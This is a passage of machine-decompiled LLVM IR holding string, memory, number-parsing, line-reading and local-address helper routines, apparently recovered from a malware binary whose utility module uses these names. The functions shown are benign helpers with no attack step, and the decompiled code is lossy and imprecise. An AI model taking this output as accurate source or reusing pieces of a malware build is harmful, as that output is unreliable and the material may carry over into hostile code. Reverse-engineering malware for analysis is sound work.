  uselistorder i32 %v0_fd68, { 1, 0 }
  uselistorder i32 %v0_fd48, { 1, 0 }
  uselistorder i32 %v0_fd28, { 1, 0 }
  uselistorder i32 %v0_fd04, { 1, 0 }
  uselistorder i32 %v0_fcc0, { 1, 0 }
  uselistorder i32 %v0_fc58, { 1, 0 }
  uselistorder i32 %v0_fb60, { 1, 0 }
  uselistorder i32 %v0_fb40, { 1, 0 }
  uselistorder i32 %v0_fb18, { 1, 0 }
  uselistorder i32 %v0_fad4, { 1, 0 }
  uselistorder i32 %v0_faac, { 1, 0 }
  uselistorder i32 23, { 0, 4, 1, 2, 3 }
  uselistorder i32 29, { 0, 3, 4, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 26, 25, 24, 23, 22, 21, 2, 1, 0, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_2421c.209 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_ff44 = load i8, i8* %arg1, align 1
  %v2_ff48 = icmp eq i8 %v3_ff44, 0
  %v0_ff4c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_ff48, i32 %v0_ff4c)
  br label %dec_label_pc_ff54

dec_label_pc_ff54:                                ; preds = %dec_label_pc_ff54, %entry
  %v0_ff54 = phi i32 [ %v1_ff54, %dec_label_pc_ff54 ], [ 0, %entry ]
  %v1_ff54 = add i32 %v0_ff54, 1
  %v2_ff58 = add i32 %v1_ff54, %tmp
  %v3_ff58 = inttoptr i32 %v2_ff58 to i8*
  %v4_ff58 = load i8, i8* %v3_ff58, align 1
  %v6_ff58 = zext i8 %v4_ff58 to i32
  store i32 %v6_ff58, i32* @r3, align 4
  %v2_ff5c = icmp eq i8 %v4_ff58, 0
  br i1 %v2_ff5c, label %dec_label_pc_ff64, label %dec_label_pc_ff54

dec_label_pc_ff64:                                ; preds = %dec_label_pc_ff54
  ret i32 %v1_ff54
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_ff68 = load i8, i8* %arg1, align 1
  %v3_ff68 = zext i8 %v2_ff68 to i32
  store i32 %v3_ff68, i32* @r2, align 4
  %v2_ff6c = icmp eq i8 %v2_ff68, 0
  br i1 %v2_ff6c, label %bb, label %dec_label_pc_ff78

bb:                                               ; preds = %entry
  store i32 %v3_ff68, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ff8c

dec_label_pc_ff78:                                ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ff7c

dec_label_pc_ff7c:                                ; preds = %dec_label_pc_ff7c, %dec_label_pc_ff78
  %v0_ff7c = phi i32 [ %v1_ff7c, %dec_label_pc_ff7c ], [ 0, %dec_label_pc_ff78 ]
  %v1_ff7c = add i32 %v0_ff7c, 1
  store i32 %v1_ff7c, i32* %ip.global-to-local, align 4
  %v2_ff80 = add i32 %v1_ff7c, %tmp
  %v3_ff80 = inttoptr i32 %v2_ff80 to i8*
  %v4_ff80 = load i8, i8* %v3_ff80, align 1
  %v2_ff84 = icmp eq i8 %v4_ff80, 0
  br i1 %v2_ff84, label %dec_label_pc_ff8c, label %dec_label_pc_ff7c

dec_label_pc_ff8c:                                ; preds = %dec_label_pc_ff7c, %bb
  %v0_ff8c = phi i32 [ %v3_ff68, %bb ], [ %v1_ff7c, %dec_label_pc_ff7c ]
  br label %dec_label_pc_ff98

dec_label_pc_ff94:                                ; preds = %dec_label_pc_ff98
  %v0_ff94 = load i32, i32* @r1, align 4
  %v1_ff94 = add i32 %v0_ff94, 1
  %v2_ff94 = inttoptr i32 %v1_ff94 to i8*
  %v3_ff94 = load i8, i8* %v2_ff94, align 1
  %v4_ff94 = zext i8 %v3_ff94 to i32
  store i32 %v4_ff94, i32* @r2, align 4
  store i32 %v1_ff94, i32* @r1, align 4
  %v0_ff98.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_ff98

dec_label_pc_ff98:                                ; preds = %dec_label_pc_ff8c, %dec_label_pc_ff94
  %v0_ffa0.off0 = phi i8 [ %v2_ff68, %dec_label_pc_ff8c ], [ %v3_ff94, %dec_label_pc_ff94 ]
  %v0_ff98 = phi i32 [ %v0_ff8c, %dec_label_pc_ff8c ], [ %v0_ff98.pr, %dec_label_pc_ff94 ]
  %v1_ff98 = add i32 %v0_ff98, -1
  store i32 %v1_ff98, i32* @r3, align 4
  %v3_ff9c = icmp eq i32 %v0_ff98, 0
  %v2_ffa0 = load i32, i32* @r0, align 4
  %v3_ffa0 = inttoptr i32 %v2_ffa0 to i8*
  store i8 %v0_ffa0.off0, i8* %v3_ffa0, align 1
  %v4_ffa0 = load i32, i32* @r0, align 4
  %v5_ffa0 = add i32 %v4_ffa0, 1
  store i32 %v5_ffa0, i32* @r0, align 4
  br i1 %v3_ff9c, label %dec_label_pc_ffa8, label %dec_label_pc_ff94

dec_label_pc_ffa8:                                ; preds = %dec_label_pc_ff98
  %v0_ffa8 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_ffa8

; uselistorder directives
  uselistorder i32 %v0_ff98, { 1, 0 }
  uselistorder i32 %v1_ff7c, { 0, 1, 3, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_ff98, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_ffb0 = icmp eq i32 %arg3, 0
  %v0_ffb4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_ffb0, i32 %v0_ffb4)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ffbc

dec_label_pc_ffbc:                                ; preds = %dec_label_pc_ffbc, %entry
  %v0_ffbc = phi i32 [ %v1_ffc4, %dec_label_pc_ffbc ], [ 0, %entry ]
  %v2_ffbc = add i32 %v0_ffbc, %arg2
  %v3_ffbc = inttoptr i32 %v2_ffbc to i8*
  %v4_ffbc = load i8, i8* %v3_ffbc, align 1
  %v4_ffc0 = add i32 %v0_ffbc, %arg1
  %v5_ffc0 = inttoptr i32 %v4_ffc0 to i8*
  store i8 %v4_ffbc, i8* %v5_ffc0, align 1
  %v0_ffc4 = load i32, i32* %ip.global-to-local, align 4
  %v1_ffc4 = add i32 %v0_ffc4, 1
  store i32 %v1_ffc4, i32* %ip.global-to-local, align 4
  %v9_ffc8 = icmp eq i32 %v1_ffc4, %arg3
  br i1 %v9_ffc8, label %dec_label_pc_ffd0, label %dec_label_pc_ffbc

dec_label_pc_ffd0:                                ; preds = %dec_label_pc_ffbc
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_ffc4, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v0_ffd4 = load i32, i32* @r1, align 4
  %v2_ffd4 = icmp eq i32 %v0_ffd4, 0
  %v0_ffd8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_ffd4, i32 %v0_ffd8)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ffe0

dec_label_pc_ffe0:                                ; preds = %dec_label_pc_ffe0, %entry
  %v2_ffe4 = phi i32 [ %v1_ffe8, %dec_label_pc_ffe0 ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v3_ffe4 = load i32, i32* @r0, align 4
  %v4_ffe4 = add i32 %v3_ffe4, %v2_ffe4
  %v5_ffe4 = inttoptr i32 %v4_ffe4 to i8*
  store i8 0, i8* %v5_ffe4, align 1
  %v0_ffe8 = load i32, i32* %r2.global-to-local, align 4
  %v1_ffe8 = add i32 %v0_ffe8, 1
  store i32 %v1_ffe8, i32* %r2.global-to-local, align 4
  %v1_ffec = load i32, i32* @r1, align 4
  %v9_ffec = icmp eq i32 %v1_ffe8, %v1_ffec
  br i1 %v9_ffec, label %dec_label_pc_fff4, label %dec_label_pc_ffe0

dec_label_pc_fff4:                                ; preds = %dec_label_pc_ffe0
  %v1_fff4 = load i32, i32* @r0, align 4
  ret i32 %v1_fff4

; uselistorder directives
  uselistorder i32 %v1_ffe8, { 1, 2, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_1000c = icmp sgt i32 %arg4, %arg2
  br i1 %v7_1000c, label %dec_label_pc_10014, label %dec_label_pc_1001c

dec_label_pc_10014:                               ; preds = %dec_label_pc_10030, %dec_label_pc_1001c, %entry, %dec_label_pc_1005c
  %storemerge = phi i32 [ %v1_1005c, %dec_label_pc_1005c ], [ -1, %entry ], [ -1, %dec_label_pc_1001c ], [ -1, %dec_label_pc_10030 ]
  ret i32 %storemerge

dec_label_pc_1001c:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_10014, label %dec_label_pc_10024

dec_label_pc_10024:                               ; preds = %dec_label_pc_1001c
  br label %dec_label_pc_1003c

dec_label_pc_10030:                               ; preds = %bb, %dec_label_pc_10050
  %v1_1003c3 = phi i32 [ %v1_10050, %dec_label_pc_10050 ], [ 0, %bb ]
  %v1_10030 = add i32 %v0_1005c, 1
  %v9_10034 = icmp eq i32 %v1_10030, %arg2
  br i1 %v9_10034, label %dec_label_pc_10014, label %dec_label_pc_1003c

dec_label_pc_1003c:                               ; preds = %dec_label_pc_10030, %dec_label_pc_10024
  %v0_1005c = phi i32 [ %v1_10030, %dec_label_pc_10030 ], [ 0, %dec_label_pc_10024 ]
  %v1_1003c = phi i32 [ %v1_1003c3, %dec_label_pc_10030 ], [ 0, %dec_label_pc_10024 ]
  %v2_1003c = add i32 %v1_1003c, %arg3
  %v3_1003c = inttoptr i32 %v2_1003c to i8*
  %v4_1003c = load i8, i8* %v3_1003c, align 1
  %v2_10040 = add i32 %v0_1005c, %arg1
  %v3_10040 = inttoptr i32 %v2_10040 to i8*
  %v4_10040 = load i8, i8* %v3_10040, align 1
  %v9_10044 = icmp eq i8 %v4_10040, %v4_1003c
  br i1 %v9_10044, label %dec_label_pc_10050, label %bb

bb:                                               ; preds = %dec_label_pc_1003c
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10030

dec_label_pc_10050:                               ; preds = %dec_label_pc_1003c
  %v1_10050 = add i32 %v1_1003c, 1
  store i32 %v1_10050, i32* @ip, align 4
  %v9_10054 = icmp eq i32 %v1_10050, %arg4
  br i1 %v9_10054, label %dec_label_pc_1005c, label %dec_label_pc_10030

dec_label_pc_1005c:                               ; preds = %dec_label_pc_10050
  %v1_1005c = add i32 %v0_1005c, 1
  br label %dec_label_pc_10014

; uselistorder directives
  uselistorder i32 %v1_10050, { 1, 2, 0 }
  uselistorder i32 %v1_1003c, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10030, { 1, 0 }
  uselistorder label %dec_label_pc_10014, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_10074

dec_label_pc_10074:                               ; preds = %.thread, %dec_label_pc_10088, %bb, %entry
  %v0_10074 = phi i32 [ %tmp, %entry ], [ %v5_10074, %bb ], [ %v5_10074, %dec_label_pc_10088 ], [ %v5_10074, %.thread ]
  %v1_10074 = inttoptr i32 %v0_10074 to i8*
  %v2_10074 = load i8, i8* %v1_10074, align 1
  %v5_10074 = add i32 %v0_10074, 1
  %v7_10078 = icmp eq i8 %v2_10074, 9
  br i1 %v7_10078, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10074
  br label %dec_label_pc_10074

bb:                                               ; preds = %dec_label_pc_10074
  %v8_1007c = icmp eq i8 %v2_10074, 32
  br i1 %v8_1007c, label %dec_label_pc_10074, label %dec_label_pc_10088

dec_label_pc_10088:                               ; preds = %bb
  %v7_10088 = icmp eq i8 %v2_10074, 10
  br i1 %v7_10088, label %dec_label_pc_10074, label %dec_label_pc_10090

dec_label_pc_10090:                               ; preds = %dec_label_pc_10088
  %v7_10090 = icmp eq i8 %v2_10074, 45
  br i1 %v7_10090, label %dec_label_pc_10180, label %dec_label_pc_10098

dec_label_pc_10098:                               ; preds = %dec_label_pc_10090
  %v7_10098 = icmp eq i8 %v2_10074, 43
  br i1 %v7_10098, label %bb54, label %dec_label_pc_100a8

bb54:                                             ; preds = %dec_label_pc_10098
  %v2_1009c = inttoptr i32 %v5_10074 to i8*
  %v3_1009c = load i8, i8* %v2_1009c, align 1
  %v6_1009c = add i32 %v0_10074, 2
  br label %dec_label_pc_100a8

dec_label_pc_100a8:                               ; preds = %bb54, %dec_label_pc_10098, %dec_label_pc_10180
  %v1_1015039 = phi i32 [ %v5_10180, %dec_label_pc_10180 ], [ %v5_10074, %dec_label_pc_10098 ], [ %v6_1009c, %bb54 ]
  %v0_100d010.in = phi i8 [ %v2_10180, %dec_label_pc_10180 ], [ %v2_10074, %dec_label_pc_10098 ], [ %v3_1009c, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_10180 ], [ 2147483647, %dec_label_pc_10098 ], [ 2147483647, %bb54 ]
  %v0_10190 = phi i32 [ 1, %dec_label_pc_10180 ], [ 0, %dec_label_pc_10098 ], [ 0, %bb54 ]
  %v2_100b0 = udiv i32 %storemerge1, %arg2
  %v3_100b0 = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_100d0.outer

dec_label_pc_100d0.outer:                         ; preds = %.thread5, %dec_label_pc_100a8
  %v1_10150.ph = phi i32 [ %v6_10150, %.thread5 ], [ %v1_1015039, %dec_label_pc_100a8 ]
  %v2_1014c.ph = phi i32 [ %v5_1014c, %.thread5 ], [ 0, %dec_label_pc_100a8 ]
  %v1_10110.ph.in = phi i8 [ %v3_10150, %.thread5 ], [ %v0_100d010.in, %dec_label_pc_100a8 ]
  %v1_10128.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_100a8 ]
  %v3_1011c = icmp uge i32 %v2_1014c.ph, %v2_100b0
  %v9_1011c = icmp eq i32 %v2_1014c.ph, %v2_100b0
  %v2_10120 = xor i1 %v3_1011c, true
  %v3_10120 = or i1 %v9_1011c, %v2_10120
  %v2_10124 = xor i1 %v9_1011c, true
  %v3_10124 = and i1 %v3_1011c, %v2_10124
  %v2_10144 = icmp eq i1 %v9_1011c, false
  br label %dec_label_pc_100d0

dec_label_pc_100d0:                               ; preds = %dec_label_pc_100d0.outer, %dec_label_pc_10158
  %v1_10150 = phi i32 [ %v5_10158, %dec_label_pc_10158 ], [ %v1_10150.ph, %dec_label_pc_100d0.outer ]
  %v1_10128 = phi i32 [ -1, %dec_label_pc_10158 ], [ %v1_10128.ph, %dec_label_pc_100d0.outer ]
  %v1_10110.in = phi i8 [ %v2_10158, %dec_label_pc_10158 ], [ %v1_10110.ph.in, %dec_label_pc_100d0.outer ]
  %v1_10110 = zext i8 %v1_10110.in to i32
  %v1_100d0 = urem i32 %v1_10110, 256
  %v1_100d4 = add nsw i32 %v1_100d0, -48
  %v1_100dc = add nsw i32 %v1_100d0, -97
  %v1_100e0 = add nsw i32 %v1_10110, -48
  %v1_100e4 = add nsw i32 %v1_100d0, -65
  %tmp87 = icmp ult i32 %v1_100d4, 10
  br i1 %tmp87, label %dec_label_pc_10114, label %dec_label_pc_100ec

dec_label_pc_100ec:                               ; preds = %dec_label_pc_100d0
  %v2_100ec = icmp ugt i32 %v1_100e4, 24
  %v7_100ec = icmp eq i32 %v1_100e4, 25
  %v2_100f0 = xor i1 %v7_100ec, true
  %v3_100f0 = and i1 %v2_100ec, %v2_100f0
  br i1 %v3_100f0, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_100ec
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_100ec, %bb55
  %v0_1010415 = phi i32 [ %v1_100e0, %dec_label_pc_100ec ], [ 0, %bb55 ]
  %v2_100f4 = xor i1 %v2_100ec, true
  %v3_100f4 = or i1 %v7_100ec, %v2_100f4
  br i1 %v3_100f4, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_10104 = phi i32 [ %v0_1010415, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_100f0, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_100fc = icmp ugt i32 %v1_100dc, 24
  %v11_100fc = icmp eq i32 %v1_100dc, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_10100 = phi i1 [ %v7_100ec, %bb58 ], [ %v11_100fc, %bb59 ]
  %v0_10100 = phi i1 [ %v2_100ec, %bb58 ], [ %v6_100fc, %bb59 ]
  %v2_10100 = xor i1 %v1_10100, true
  %v3_10100 = and i1 %v0_10100, %v2_10100
  br i1 %v3_10100, label %dec_label_pc_10164, label %dec_label_pc_10104

dec_label_pc_10104:                               ; preds = %bb60
  %v2_10104 = icmp eq i32 %v0_10104, 0
  %. = select i1 %v2_10104, i32 87, i32 55
  %v2_10110 = sub nsw i32 %v1_10110, %.
  br label %dec_label_pc_10114

dec_label_pc_10114:                               ; preds = %dec_label_pc_100d0, %dec_label_pc_10104
  %v0_1012833 = phi i32 [ %v1_100e4, %dec_label_pc_100d0 ], [ %., %dec_label_pc_10104 ]
  %v3_1014c = phi i32 [ %v1_100e0, %dec_label_pc_100d0 ], [ %v2_10110, %dec_label_pc_10104 ]
  %v2_10114 = sub i32 %v3_1014c, %arg2
  %v4_10114 = xor i32 %v3_1014c, %arg2
  %v5_10114 = xor i32 %v2_10114, %v3_1014c
  %v6_10114 = and i32 %v5_10114, %v4_10114
  %v7_10114 = icmp slt i32 %v6_10114, 0
  %v8_10114 = icmp slt i32 %v2_10114, 0
  %v2_10118 = xor i1 %v8_10114, %v7_10114
  br i1 %v2_10118, label %dec_label_pc_1011c, label %dec_label_pc_10164

dec_label_pc_1011c:                               ; preds = %dec_label_pc_10114
  br i1 %v3_10120, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_1011c
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_1011c, %bb63
  %v0_1012832 = phi i32 [ %v0_1012833, %dec_label_pc_1011c ], [ 0, %bb63 ]
  br i1 %v3_10124, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_10128 = phi i32 [ %v0_1012832, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_10128, 0
  %v4_10128 = zext i1 %tmp88 to i32
  %v5_10128 = or i32 %v0_10128, %v4_10128
  %v7_10128 = icmp eq i32 %v5_10128, 0
  br i1 %v7_10128, label %dec_label_pc_10130, label %dec_label_pc_10158

dec_label_pc_10130:                               ; preds = %bb66
  %v2_1013c = sub i32 %v3_1014c, %v3_100b0
  %v4_1013c = xor i32 %v3_1014c, %v3_100b0
  %v5_1013c = xor i32 %v2_1013c, %v3_1014c
  %v6_1013c = and i32 %v5_1013c, %v4_1013c
  %v7_1013c = icmp slt i32 %v6_1013c, 0
  %v8_1013c = icmp slt i32 %v2_1013c, 0
  %v9_1013c = icmp eq i32 %v3_1014c, %v3_100b0
  %v3_10140 = xor i1 %v8_1013c, %v7_1013c
  %v4_10140 = or i1 %v9_1013c, %v3_10140
  br i1 %v4_10140, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_10130
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_10130
  br i1 %v2_10144, label %.thread5, label %dec_label_pc_10158

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_1014c = mul i32 %v2_1014c.ph, %arg2
  %v5_1014c = add i32 %v3_1014c, %v4_1014c
  %v2_10150 = inttoptr i32 %v1_10150 to i8*
  %v3_10150 = load i8, i8* %v2_10150, align 1
  %v6_10150 = add i32 %v1_10150, 1
  br label %dec_label_pc_100d0.outer

dec_label_pc_10158:                               ; preds = %thread-pre-split, %bb66
  %v1_10158 = inttoptr i32 %v1_10150 to i8*
  %v2_10158 = load i8, i8* %v1_10158, align 1
  %v5_10158 = add i32 %v1_10150, 1
  br label %dec_label_pc_100d0

dec_label_pc_10164:                               ; preds = %dec_label_pc_10114, %bb60
  %v1_10164 = icmp slt i32 %v1_10128, 0
  %v2_10190 = icmp eq i32 %v0_10190, 0
  br i1 %v1_10164, label %dec_label_pc_10190, label %dec_label_pc_1016c

dec_label_pc_1016c:                               ; preds = %dec_label_pc_10164
  br i1 %v2_10190, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_1016c
  %v2_10170 = sub i32 0, %v2_1014c.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_1016c, %bb69
  %v1_1017c = phi i32 [ -2147483648, %bb71 ], [ %v2_1014c.ph, %dec_label_pc_1016c ], [ %v2_10170, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_1017c

dec_label_pc_10180:                               ; preds = %dec_label_pc_10090
  %v1_10180 = inttoptr i32 %v5_10074 to i8*
  %v2_10180 = load i8, i8* %v1_10180, align 1
  %v5_10180 = add i32 %v0_10074, 2
  br label %dec_label_pc_100a8

dec_label_pc_10190:                               ; preds = %dec_label_pc_10164
  br i1 %v2_10190, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_10190
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_10190
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_10190, { 1, 0 }
  uselistorder i32 %v2_1013c, { 1, 0 }
  uselistorder i32 %v2_10114, { 1, 0 }
  uselistorder i32 %v3_1014c, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_100ec, { 1, 2, 0 }
  uselistorder i1 %v2_100ec, { 1, 0, 2 }
  uselistorder i32 %v1_100d0, { 1, 2, 0 }
  uselistorder i32 %v1_10110, { 1, 0, 2 }
  uselistorder i32 %v1_10128, { 1, 0 }
  uselistorder i32 %v1_10150, { 2, 3, 1, 0 }
  uselistorder i1 %v9_1011c, { 1, 0, 2 }
  uselistorder i1 %v3_1011c, { 1, 0 }
  uselistorder i32 %v2_1014c.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_100b0, { 1, 0, 2 }
  uselistorder i32 %v2_100b0, { 1, 0 }
  uselistorder i32 %v5_10074, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_10074, { 0, 1, 3, 2 }
  uselistorder i32 25, { 20, 21, 5, 12, 2, 11, 3, 13, 4, 14, 10, 6, 15, 0, 16, 7, 8, 17, 9, 18, 1, 19 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 0, 1, 13, 2, 3, 4, 5, 6, 7 }
  uselistorder i8 9, { 2, 0, 1 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_10114, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_100d0, { 1, 0 }
  uselistorder label %dec_label_pc_100a8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10074, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_101a0 = load i32, i32* @r4, align 4
  store i32 %v3_101a0, i32* %stack_var_-24, align 4
  %v6_101a0 = load i32, i32* @r5, align 4
  %v9_101a0 = load i32, i32* @r6, align 4
  %v12_101a0 = load i32, i32* @r7, align 4
  %v15_101a0 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_101b8

dec_label_pc_101b8:                               ; preds = %dec_label_pc_101dc.dec_label_pc_101b8_crit_edge, %entry
  %v0_101bc = phi i32 [ %v0_101bc.pre, %dec_label_pc_101dc.dec_label_pc_101b8_crit_edge ], [ %arg3, %entry ]
  %v0_101b8 = phi i32 [ %v5_101dc, %dec_label_pc_101dc.dec_label_pc_101b8_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_101b8, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_101c4 = call i32 @__libc_read(i32 %v0_101bc)
  %v7_101c8 = icmp eq i32 %v1_101c4, 1
  %v0_101d0 = load i32, i32* @r5, align 4
  br i1 %v7_101c8, label %dec_label_pc_101d0, label %dec_label_pc_101e8

dec_label_pc_101d0:                               ; preds = %dec_label_pc_101b8
  %v1_101d0 = add i32 %v0_101d0, 1
  store i32 %v1_101d0, i32* @r5, align 4
  %v1_101d4 = load i32, i32* @r8, align 4
  %v6_101d8 = icmp slt i32 %v1_101d0, %v1_101d4
  br i1 %v6_101d8, label %dec_label_pc_101dc, label %.loopexit

dec_label_pc_101dc:                               ; preds = %dec_label_pc_101d0
  %v0_101dc = load i32, i32* @r4, align 4
  %v1_101dc = inttoptr i32 %v0_101dc to i8*
  %v2_101dc = load i8, i8* %v1_101dc, align 1
  %v3_101dc = zext i8 %v2_101dc to i32
  store i32 %v3_101dc, i32* @r3, align 4
  %v5_101dc = add i32 %v0_101dc, 1
  store i32 %v5_101dc, i32* @r4, align 4
  %v7_101e0 = icmp eq i8 %v2_101dc, 10
  br i1 %v7_101e0, label %dec_label_pc_101e8, label %dec_label_pc_101dc.dec_label_pc_101b8_crit_edge

dec_label_pc_101dc.dec_label_pc_101b8_crit_edge:  ; preds = %dec_label_pc_101dc
  %v0_101bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_101b8

dec_label_pc_101e8:                               ; preds = %dec_label_pc_101b8, %dec_label_pc_101dc
  %v0_101e8 = phi i32 [ %v1_101d0, %dec_label_pc_101dc ], [ %v0_101d0, %dec_label_pc_101b8 ]
  %v2_101e8 = icmp eq i32 %v0_101e8, 0
  br i1 %v2_101e8, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_101e8
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_101d0, %dec_label_pc_101e8, %bb
  %v0_101f0 = load i32, i32* @r7, align 4
  %v2_101f4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_101f4, i32* @r4, align 4
  store i32 %v6_101a0, i32* @r5, align 4
  store i32 %v9_101a0, i32* @r6, align 4
  store i32 %v12_101a0, i32* @r7, align 4
  store i32 %v15_101a0, i32* @r8, align 4
  ret i32 %v0_101f0

; uselistorder directives
  uselistorder i32 %v5_101dc, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_101e8, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_101fc = load i32, i32* @r4, align 4
  %v6_101fc = load i32, i32* @r5, align 4
  %v9_101fc = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_1020c = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10214 = inttoptr i32 %v0_1020c to i32*
  store i32 0, i32* %v2_10214, align 4
  %v0_10220 = load i32, i32* %r4.global-to-local, align 4
  %v3_10224 = call i32 @socket(i32 2, i32 2, i32 %v0_10220)
  %v7_10228 = icmp eq i32 %v3_10224, -1
  store i32 %v3_10224, i32* @r5, align 4
  br i1 %v7_10228, label %bb, label %dec_label_pc_10238

bb:                                               ; preds = %entry
  %v1_10230 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10284

dec_label_pc_10238:                               ; preds = %entry
  %v2_10244 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10244, i32* @r4, align 4
  %v0_10250 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_10264 = call i32 @__libc_connect(i32 %v3_10224, i32 %v2_10244, i32 %v0_10250)
  store i32 %v2_10244, i32* @r1, align 4
  %v2_1026c = ptrtoint i32* %stack_var_-20 to i32
  %v0_10270 = load i32, i32* @r5, align 4
  %v3_10274 = call i32 @__GI_getsockname(i32 %v0_10270, i32 %v2_10244, i32 %v2_1026c)
  %v0_10278 = load i32, i32* @r5, align 4
  %v1_1027c = call i32 @__GI___libc_close(i32 %v0_10278)
  br label %dec_label_pc_10284

dec_label_pc_10284:                               ; preds = %bb, %dec_label_pc_10238
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10238 ], [ %v1_10230, %bb ]
  store i32 %v3_101fc, i32* @r4, align 4
  store i32 %v6_101fc, i32* @r5, align 4
  store i32 %v9_101fc, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10244, { 1, 0, 2, 3 }
